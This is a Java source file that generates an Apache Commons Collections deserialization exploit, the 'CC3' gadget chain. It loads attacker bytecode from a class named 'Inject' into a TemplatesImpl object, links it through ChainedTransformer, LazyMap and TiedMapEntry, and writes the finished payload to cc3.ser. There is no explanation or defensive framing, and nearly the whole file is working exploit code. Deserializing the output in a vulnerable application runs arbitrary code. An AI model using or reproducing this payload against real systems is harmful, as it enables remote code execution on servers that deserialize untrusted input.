
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
 
import javax.xml.transform.Templates;
import java.io.*;
import java.util.HashMap;
import java.util.Map;
 
import java.lang.reflect.Field;
 
public class CC3 {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
 
    public static void main(String[] args) throws Exception {
        Transformer[] faketransformers = new Transformer[]{new ConstantTransformer(1)};
        byte[] code = ClassPool.getDefault().getCtClass("Inject").toBytecode();
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][]{code});
        setFieldValue(obj, "_name", "xxx");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{obj})
        };
        Transformer transformersChain = new ChainedTransformer(faketransformers);
 
        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, transformersChain);
 
        TiedMapEntry tme = new TiedMapEntry(outerMap, "keykey");
 
        Map expMap = new HashMap();
        expMap.put(tme, "valuevalue");
        outerMap.remove("keykey");
 
        setFieldValue(transformersChain, "iTransformers", transformers);
 
        // ⽣成序列化字符串
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("cc3.ser"));
        oos.writeObject(expMap);
        oos.close();
    }
}